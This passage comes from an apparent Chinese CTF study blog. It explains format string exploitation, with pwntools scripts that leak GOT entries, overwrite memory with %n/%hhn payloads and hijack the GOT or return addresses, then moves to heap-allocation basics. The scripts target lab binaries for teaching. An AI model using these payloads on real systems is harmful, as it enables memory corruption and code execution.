0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li><strong>n</strong>，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li></ul></li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733155009147.png" alt="格式"></p><h3 id="参数位置"><a href="#参数位置" class="headerlink" title="参数位置"></a>参数位置</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>参数全在栈上</p><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>前6个参数由寄存器存放，rdi存储格式化字符串的地址，也就是说从%6$p在栈上</p><p>rdi  rsi  rdx  r10  r8  r9</p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fmtarg addr</span><br></code></pre></td></tr></table></figure><p>能直接看到地址相对于printf函数和格式化字符串地址的偏移</p><h3 id="常见格式化字符串函数"><a href="#常见格式化字符串函数" class="headerlink" title="常见格式化字符串函数"></a>常见格式化字符串函数</h3><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733328075199.png" alt="常见函数"></p><h2 id="格式化字符串的利用"><a href="#格式化字符串的利用" class="headerlink" title="格式化字符串的利用"></a>格式化字符串的利用</h2><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>理论依据：格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取) </p><p>这里以32位举例说明</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760093914.png" alt="main"></p><p>运行查看结果</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760198590.png" alt="结果"></p><p>gdb调试，断点下在两个printf处，查看栈上信息</p><p>第一个printf处</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760238293.png" alt="gdb"></p><p>可以看到 栈中第一个变量（esp）为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们**输入的格式化字符串对应的地址 **</p><p>继续运行</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760387677.png" alt="gdb"></p><p> 程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出 。</p><p>但上述输出需要输入很多个%x%x，如果<strong>需要获取某个参数，可以直接 %n$x</strong> ，这个n就是栈上的参数相对于格式化字符串的偏移，例如上面图片的0xffffcd0c就是%3$x，当然也可以%p来获取地址</p><p><strong>需要快速获取位移的话就可以来利用利用原理篇的gdb</strong></p><h4 id="获取栈变量对于字符串"><a href="#获取栈变量对于字符串" class="headerlink" title="获取栈变量对于字符串"></a>获取栈变量对于字符串</h4><p>就是%s，将对应处的变量解析为字符串地址进行输出</p><p><strong>如果不能被解析为字符串变量，则程序会崩溃</strong></p><p>所以快速让程序崩溃的一个办法就是输入一大串%s%s….</p><h4 id="小技巧总结"><a href="#小技巧总结" class="headerlink" title="小技巧总结"></a>小技巧总结</h4><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有<strong>零截断</strong>。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p> &#x3D;完全控制泄露<strong>某个指定地址的内存</strong> </p><p>方法：获取<strong>某个addr的内容</strong>：<code>addr%k$s</code>这里的k是该格式化字符相对函数调用的第k个参数</p><p>那么想办法确认k就好了</p><p><strong>方法：</strong></p><p>输入[tag]%p%p%p%p%p查看哪个%p跟tag一样（比如aaaa%p%p%p%p%p）</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734022426662.png" alt="结果"></p><p>0x41414141跟我输入的AAAA一样，是<strong>格式化字符串的第4个参数</strong>所以k&#x3D;4即可输出该地址上的内容</p><p><strong>应用：</strong></p><ol><li><p>获取真实地址  例如获取scanf</p><ul><li><p>获取scanf@got<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734022850762.png" alt="got表"><br>gdb也是输入got\n就可以了</p></li><li><p>然后就scanf@got%4$s就可以输出got真实地址了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])) <span class="hljs-comment"># remove the first bytes of __isoc99_scanf@got 意思是会先将scanf@got打印出来然后才是scanf真实地址所以要接收后4字节</span><br>sh.interactive()<br></code></pre></td></tr></table></figure></li></ul></li></ol><p><strong>注意：</strong></p><p>并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[padding]</span><span class="hljs-selector-attr">[addr]</span><br></code></pre></td></tr></table></figure><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p> 修改栈上变量的值，甚至修改任意地址变量的内存 </p><p>方法：<code>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</code></p><p>以如下代码为例：(32)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">/* example/overflow/overflow.c */<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-built_in">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-built_in">int</span> main() &#123;<br>  <span class="hljs-built_in">int</span> c = <span class="hljs-number">789</span>;<br>  char s[<span class="hljs-number">100</span>];<br>  printf(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  printf(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>基本payload格式：</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">...[overwrite addr]....%[overwrite <span class="hljs-built_in">offset</span>]$<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p> 其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数 </p><p><strong>一般步骤：</strong></p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>目的：进入第一个if语句</p><ol><li><p>地址：</p><p>上面程序有打印c的地址，直接用即可</p></li><li><p>偏移：</p><p>gdb调试</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734091929291.png" alt="gdb"></p><p>发现是第6个参数，所以是%6$n</p></li><li><p>覆盖</p><p>payload如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></td></tr></table></figure><p>因为addr of c栈4字节，所以再补充12个字节即可将c覆盖成16</p></li></ol><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br><span class="hljs-built_in">print</span> payload<br><span class="hljs-comment">#gdb.attach(sh)</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>问题：当我需要覆盖的数字小于4&#x2F;8时，会导致覆盖失败，因为addr of a就占了4字节</p><p>解决：没有必要一定将addr放在最前面，只要知道偏移即可</p><p>当我们将a覆盖为2时，格式必须是</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">aa<span class="hljs-built_in">%k</span><span class="hljs-built_in">$nxxxxx</span>(xxx是后面的内容)<br></code></pre></td></tr></table></figure><p>围绕这个展开</p><ol><li><p>确定地址<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734095378872.png" alt="IDA"></p></li><li><p>确定偏移<br>aa%k$n已经占了6字节，在覆盖栈内存时可知偏移为6，这里我们构造成aa%k$aa这样就占了8字节，刚好占2，所以将上面的偏移往后推2即可，可得出k为8</p></li><li><p>进行覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>a_addr = <span class="hljs-number">0x0804A024</span><br>payload = <span class="hljs-string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)<br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure></li></ol><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p><strong>变量在内存中的存储格式：</strong></p><p> 首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。 </p><p>types：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">hh 对于整数类型，printf期待一个从<span class="hljs-type">char</span>提升的<span class="hljs-type">int</span>尺寸的整型参数。<br>h  对于整数类型，printf期待一个从<span class="hljs-type">short</span>提升的<span class="hljs-type">int</span>尺寸的整型参数。<br></code></pre></td></tr></table></figure><p>所以可利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节</p><ol><li><p>确定覆盖的地址<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734096669149.png" alt="IDA"></p><p>如何覆盖<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734096681348.png" alt="^^"></p></li><li><p>确定偏移<br>由覆盖栈内存可得出偏移是6</p><p>payload格式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x0804A028)</span></span>+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A029)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A02a)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A02b)+pad1+<span class="hljs-string">&#x27;%6$hhn&#x27;</span>+pad2+<span class="hljs-string">&#x27;%7$hhn&#x27;</span>+pad3+<span class="hljs-string">&#x27;%8$hhn&#x27;</span>+pad4+<span class="hljs-string">&#x27;%9$hhn&#x27;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h3><p> 在目前的 C 程序中，libc 中的函数都是通过<strong>GOT 表来跳转</strong>的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是<strong>可以被修改的</strong>  因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如<strong>说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</strong> </p><p>加入将函数A的地址覆盖为函数B的地址，有如下步骤：</p><ul><li><p>确定函数 A 的 GOT 表地址。</p><ul><li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li></ul></li><li><p>确定函数 B 的内存地址</p><ul><li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li></ul></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li><p>写入函数：write 函数。</p></li><li><p>ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pop eax; ret;           <span class="hljs-comment"># printf@got -&gt; eax</span><br>pop ebx; ret;           <span class="hljs-comment"># (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br>add [eax] ebx; ret;     <span class="hljs-comment"># [printf@got] = [printf@got] + addr_offset</span><br></code></pre></td></tr></table></figure></li><li><p>格式化字符串任意地址写</p></li></ul></li></ul></li><li><p>payload &#x3D; fmtstr_payload(offset,{printf_got:system_plt}) 用来将地址替换掉，这里是将printf_got替换成为system_plt，offset是格式化字符串的偏移</p><p>这个是专门为<strong>32位</strong>程序格式化字符串漏洞输出payload的一个函数</p></li></ul><h3 id="hijack-retadder"><a href="#hijack-retadder" class="headerlink" title="hijack retadder"></a>hijack retadder</h3><p>利用格式化字符串来控制程序的返回地址（可能是用在开了RELRO，无法修改got的情况？）</p><p>思路：</p><p> 存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算</p><ul><li>确定偏移</li><li>获取函数的 rbp 与返回地址</li><li>根据相对偏移获取存储返回地址的地址</li><li>将执行 system 函数调用的地址写入到存储返回地址的地址。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆</title>
    <link href="/2025/01/28/%E5%A0%86/"/>
    <url>/2025/01/28/%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="堆简介"><a href="#堆简介" class="headerlink" title="堆简介"></a>堆简介</h2><p> 提供<strong>动态分配</strong>的内存      </p><p> 堆其实就是程序虚拟地址空间的一块<strong>连续</strong>的线性区域，它由<strong>低地址向高地址方向增长</strong>（栈是高地址向低地址）。我们一般称管理堆的那部分程序为堆管理器。 </p><p><strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>  所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户<strong>使用到</strong>相应的内存时，系统才会真正分配物理页面给用户使用。 </p><h2 id="堆基本操作"><a href="#堆基本操作" class="headerlink" title="堆基本操作"></a>堆基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>原型：<code>void *malloc(size_t size);</code></p><p>对异常状况的处理：</p><ul><li>当 n&#x3D;0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p> free(void* p) </p><p>此外，该函数也同样对异常情况进行了处理</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间<strong>还给系统</strong>，以便于减小程序所使用的内存空间。</li></ul><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><p>无论是maclloc还是free都<strong>不是</strong>直接与系统交互的函数，这些函数背后的调用主要是(s)brk函数和mmap,munmap函数</p><p>当使用内存块申请操作时</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/735202994948.png" alt="系统调用"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加brk 的大小来向操作系统申请内存。 </p><p>初始时，堆的起始地址start_brk以及堆的当前末尾 brk指向<strong>同一地址</strong>。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向<strong>data&#x2F;bss 段的结尾</strong>。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的<strong>随机偏移处</strong>。</li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/735203153769.png" alt="结构"></p><p>brk和sbrk</p><p><code>sbrk</code>和<code>brk</code>是UNIX和类UNIX操作系统中用于管理进程数据段（堆）的两个系统调用。它们都用于改变进程的堆大小，但它们的使用方式和行为有所不同。</p><h5 id="sbrk函数"><a href="#sbrk函数" class="headerlink" title="sbrk函数"></a><code>sbrk</code>函数</h5><p><code>sbrk</code>函数用于申请或释放堆内存。它的原型是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> increment)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>increment</code>：指定堆应该增加或减少的字节数。正值表示增加堆的大小，负值表示减少堆的大小。</li><li>返回值：<code>sbrk</code>返回新的堆顶地址。</li></ul><p><code>sbrk</code>的工作方式是将堆顶（program break）向上或向下移动指定的字节数。如果<code>increment</code>是正数，堆增长；如果是负数，堆缩小。<code>sbrk</code>的返回值是操作前的堆顶地址。</p><h5 id="brk函数"><a href="#brk函数" class="headerlink" title="brk函数"></a><code>brk</code>函数</h5><p><code>brk</code>函数用于设置堆的上限。它的原型是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">brk</span><span class="hljs-params">(<span class="hljs-type">void</span> *end_data_segment)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>end_data_segment</code>：指定新的堆顶地址。</li><li>返回值：<code>brk</code>返回0表示成功，或者在出错时返回-1。</li></ul><p><code>brk</code>将堆顶设置为指定的地址。如果新的堆顶低于当前堆中已分配的内存（即堆缩小），<code>brk</code>可能会失败并返回-1。如果新的堆顶高于当前堆的大小（即堆增长），操作系统可能会分配更多的内存。</p><h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><ol><li><p><strong>操作方式</strong>：</p><ul><li><code>sbrk</code>通过指定要增加或减少的字节数来改变堆的大小。</li><li><code>brk</code>直接设置堆的新上限地址。</li></ul></li><li><p><strong>返回值</strong>：</p><ul><li><code>sbrk</code>返回操作前的堆顶地址。</li><li><code>brk</code>返回0表示成功，返回-1表示失败。</li></ul></li><li><p><strong>行为</strong>：</p><ul><li><code>sbrk</code>在增加堆时，如果新的堆顶超过了系统为进程分配的最大堆大小，<code>sbrk</code>会失败。</li><li><code>brk</code>在设置堆顶时，如果新的堆顶低于已分配的内存，<code>brk</code>会失败。</li></ul></li></ol><p>在现代操作系统中，<code>malloc</code>和<code>free</code>等高级内存管理函数通常是基于<code>sbrk</code>和<code>brk</code>实现的，但在大多数情况下，程序员不需要直接使用<code>sbrk</code>和<code>brk</code>，而是使用这些更高级的抽象。</p><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sbrk and brk example */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">void</span> *curr_brk, *tmp_brk = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());<br><br>        <span class="hljs-comment">/* sbrk(0) gives current program break location */</span><br>        tmp_brk = curr_brk = sbrk(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//这里使这两个变量都是堆的初始地址，这里还没有出现堆</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        <span class="hljs-comment">/* brk(addr) increments/decrements program break location */</span><br>        brk(curr_brk+<span class="hljs-number">4096</span>);<br><span class="hljs-comment">//开始出现堆，大小位4kb</span><br>        curr_brk = sbrk(<span class="hljs-number">0</span>);<span class="hljs-comment">//sbrk本质是向上或向下控制堆的大小并返回结果地址，这里传参数0就是不对堆做任何的大小上的改变，返回的地址也就是此时堆顶部的地址了</span><br><span class="hljs-comment">//这里获取此时堆顶部的地址</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        brk(tmp_brk);<br><span class="hljs-comment">//释放堆</span><br>        curr_brk = sbrk(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mmap</code> 和 <code>munmap</code> 是在 Unix 和类 Unix 操作系统中用于内存管理的两个系统调用，它们允许程序映射文件或设备到进程的地址空间，以及撤销这种映射。这些调用通常用于实现内存映射文件，这是一种高效的文件 I&#x2F;O 方法，也可以用于动态内存分配。</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><h5 id="mmap-1"><a href="#mmap-1" class="headerlink" title="mmap"></a><code>mmap</code></h5><p><code>mmap</code> 系统调用用于将一个文件或者其他对象映射到进程的地址空间。这允许程序像访问普通内存一样访问文件内容，而不需要使用传统的 read 和 write 系统调用。<code>mmap</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：映射区域的起始地址，通常设置为 NULL 让系统选择地址。</li><li><code>length</code>：映射区域的长度。</li><li><code>prot</code>：映射区域的保护方式，可以是以下几种方式的组合：PROT_EXEC（可执行）、PROT_READ（可读）、PROT_WRITE（可写）、PROT_NONE（不可访问）。</li><li><code>flags</code>：映射类型和属性的标志，常用的标志包括 MAP_SHARED（对映射区域的修改会反映到文件上）、MAP_PRIVATE（私有的copy-on-write映射）、MAP_ANONYMOUS（匿名映射，不与任何文件关联）等。</li><li><code>fd</code>：被映射文件的文件描述符，如果是匿名映射则设置为 -1。</li><li><code>offset</code>：文件映射的起始位置，通常为文件大小的整数倍。</li></ul><p><code>mmap</code> 返回值是映射区域的起始地址，如果失败则返回 MAP_FAILED（通常是(void *)-1）。</p><h5 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a><code>munmap</code></h5><p><code>munmap</code> 系统调用用于撤销由 <code>mmap</code> 创建的内存映射。<code>munmap</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：要撤销映射的起始地址。</li><li><code>length</code>：要撤销映射的长度，必须与原始 